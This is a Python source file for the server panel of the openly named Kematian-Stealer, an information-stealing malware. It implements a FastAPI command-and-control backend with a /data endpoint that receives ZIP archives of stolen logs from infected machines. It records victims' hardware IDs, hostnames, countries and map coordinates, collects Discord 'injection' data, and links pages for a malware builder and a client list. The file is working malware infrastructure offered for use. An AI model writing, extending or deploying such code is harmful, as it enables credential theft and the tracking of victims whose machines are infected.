import os
import uuid
import json
import aiofiles
import aiosqlite

from datetime import datetime

from panel.ui.modules.first_time.first_time import MakeFiles
from panel.ui.modules.notifications.notifications import Notifications
from panel.ui.modules.settings.settings import Settings
from panel.ui.handlers.logs_handler import LogHandler

from panel.ui.pages.frames.main_frame import frame

from panel.ui.pages.injection_page import injections_page
from panel.ui.pages.index_page import fr_page
from panel.ui.pages.builder_page import builder
from panel.ui.pages.credits import credits_page
from panel.ui.pages.settings_page import settings_stuff
from panel.ui.pages.clients_page import clients_page_stuff
from panel.ui.pages.analytics_page import analytics_page_stuff

from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

from fastapi import FastAPI, File, UploadFile, HTTPException, Request
from fastapi.responses import JSONResponse

from nicegui import ui, app

limiter = Limiter(key_func=get_remote_address)
app = FastAPI()
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)


good_dir = os.getenv("APPDATA")

file_handler = MakeFiles()
file_handler.ensure_all_dirs()

db_path = os.path.join(good_dir, "Kematian-Stealer", "kdot.db")
db_path_graphs = os.path.join(good_dir, "Kematian-Stealer", "graphs.db")
db_path_map = os.path.join(good_dir, "Kematian-Stealer", "map.db")
db_path_injections = os.path.join(good_dir, "Kematian-Stealer", "injections.json")

api_base_url = "https://sped.lol"

identifier = str(uuid.uuid4())

# Notification Handler
NOTIFICATIONS = Notifications()


def check_remote_connection(request: Request):
    client_host = request.client.host
    if client_host != "127.0.0.1" and client_host != "localhost":
        raise HTTPException(status_code=403, detail="Access forbidden unless localhost")
    return True


async def initialize_database_logs():
    """Initialize the database if it doesn't exist."""
    async with aiosqlite.connect(db_path) as db:
        await db.execute(
            """
            CREATE TABLE IF NOT EXISTS entries (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hwid TEXT UNIQUE,
                country_code TEXT,
                hostname TEXT,
                date TEXT,
                timezone TEXT,
                filepath TEXT
            )
        """
        )
        await db.commit()


async def initialize_database_graphs():
    """Initialize the database if it doesn't exist."""
    async with aiosqlite.connect(db_path_graphs) as db:
        await db.execute(
            """
            CREATE TABLE IF NOT EXISTS graphs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date TEXT,
                hostname TEXT,
                country_code TEXT
            )
        """
        )
        await db.commit()


async def initalize_database_map():
    """Initialize the database if it doesn't exist."""
    async with aiosqlite.connect(db_path_map) as db:
        await db.execute(
            """
            CREATE TABLE IF NOT EXISTS map (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date TEXT,
                hostname TEXT,
                longitude TEXT,
                latitude TEXT
            )
        """
        )
        await db.commit()


@app.on_event("startup")
async def on_startup():
    """Startup event to initialize the database."""
    await initialize_database_logs()
    await initialize_database_graphs()
    await initalize_database_map()


@app.post("/data")
@limiter.limit("1/hour", error_message="Only 1 request per hour allowed")
async def receive_data(request: Request, file: UploadFile = File(...)) -> JSONResponse:
    """Receive data from the client and store it in the database.

    Args:
        file (UploadFile, optional): File that we receive. Defaults to File(...).

    Raises:
        HTTPException: Raise an exception if the file type is not a ZIP file and not formatted correctly.

    Returns:
        JSONResponse: Return a JSON response with the status of the file.
    """
    if file.content_type != "application/zip":
        raise HTTPException(
            status_code=400, detail="Invalid file type. Only ZIP files are allowed."
        )

    handler = LogHandler(file)
    info = handler.get_file_info()

    custom_path = f"{info['country_code']}-({info['hostname']})-({info['date']})-({info['timezone']})"

    async with aiosqlite.connect(db_path) as db:
        await db.execute(
            """
            INSERT OR REPLACE INTO entries (hwid, country_code, hostname, date, timezone, filepath) 
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (
                info["hwid"],
                info["country_code"],
                info["hostname"],
                info["date"],
                info["timezone"],
                os.path.join(handler.HWID_folder_dir, custom_path),
            ),
        )
        await db.commit()

    async with aiosqlite.connect(db_path_graphs) as db:
        await db.execute(
            """
            INSERT INTO graphs (date, hostname, country_code) 
            VALUES (?, ?, ?)
            """,
            (
                info["date"],
                info["hostname"],
                info["country_code"],
            ),
        )
        await db.commit()

    out = handler.unzip_file()

    if not out:
        return JSONResponse(content={"status": "error"})

    NOTIFICATIONS.send_notification(f"New log from {info['hostname']}")
    # return JSONResponse(content={"status": "ok"})

    lat_long = handler.get_longitude_latitude()

    if lat_long == (None, None):
        return JSONResponse(content={"status": "error"})

    async with aiosqlite.connect(db_path_map) as db:
        await db.execute(
            """
            INSERT OR REPLACE INTO map (date, hostname, longitude, latitude)
            VALUES (?, ?, ?, ?)
            """,
            (
                info["date"],
                info["hostname"],
                lat_long[0],
                lat_long[1],
            ),
        )
        await db.commit()

    return JSONResponse(content={"status": "ok"})


@app.post("/injection")
@limiter.limit("1/hour", error_message="Only 1 request per hour allowed")
async def injection_recieve(request: Request) -> JSONResponse:
    json_data = await request.json()

    async with aiofiles.open(
        db_path_injections, "r", encoding="utf-8", errors="ignore"
    ) as f:
        original_json_data = await f.read()

    async with aiofiles.open(
        db_path_injections, "w", encoding="utf-8", errors="ignore"
    ) as f:
        if original_json_data:
            original_json_data = json.loads(original_json_data)
        else:
            original_json_data = {}

        # Ensure 'discord' key is present and is a list
        if "discord" not in original_json_data:
            original_json_data["discord"] = []

        # Insert the new data at the beginning of the 'discord' list
        original_json_data["discord"].insert(0, json_data)

        # Sort the 'discord' list by combined 'date' and 'time' in descending order
        original_json_data["discord"].sort(
            key=lambda x: datetime.strptime(
                f"{x['date']} {x['time']}", "%m/%d/%Y %I:%M:%S %p"
            ),
            reverse=True,
        )

        await f.write(json.dumps(original_json_data, indent=4))

    return JSONResponse(content={"status": "ok"})


@ui.page("/")
async def main_page(request: Request) -> None:
    """Main page for the stealer. Very simple."""
    check_remote_connection(request)
    with frame(True):
        await fr_page()


@ui.page("/builder")
async def builder_page(request: Request) -> None:
    """Builder page for the stealer."""
    check_remote_connection(request)
    with frame(True):
        await builder()


@ui.page("/clients")
async def clients_page(request: Request) -> None:
    """Clients page for the stealer"""
    check_remote_connection(request)
    with frame(True):
        await clients_page_stuff(db_path)


@ui.page("/settings")
async def settings(request: Request) -> None:
    """Settings page for the stealer. (NEEDS TO BE REWORKED OR ATLEAST A NEW UI LMFAO)"""
    check_remote_connection(request)
    with frame(True):
        await settings_stuff()


@ui.page("/credits")
async def credits_stuff(request: Request) -> None:
    """Credits page for the stealer."""
    check_remote_connection(request)
    with frame(True):
        await credits_page()


@ui.page("/analytics")
async def analytics_page(request: Request) -> None:
    """Analytics page for the stealer."""
    check_remote_connection(request)
    with frame(True):
        await analytics_page_stuff()


@ui.page("/injections")
async def injections(request: Request) -> None:
    """Injections page for the stealer."""
    check_remote_connection(request)
    with frame(True):
        await injections_page()


@ui.page("/clients/{hwid}/{path}")
def open_client_stuff(request: Request, hwid: str, path: str) -> None:
    """Open a client's log files."""
    check_remote_connection(request)
    with frame(True):
        # await open_client(hwid, path)
        pass


ui.run_with(app, title="Kematian-Stealer")

current_settings = Settings()

if not os.path.exists(
    os.path.join(good_dir, "Kematian-Stealer", "keyfile.pem")
) or not os.path.exists(os.path.join(good_dir, "Kematian-Stealer", "certfile.pem")):
    file_handler.fix_key_and_certs()
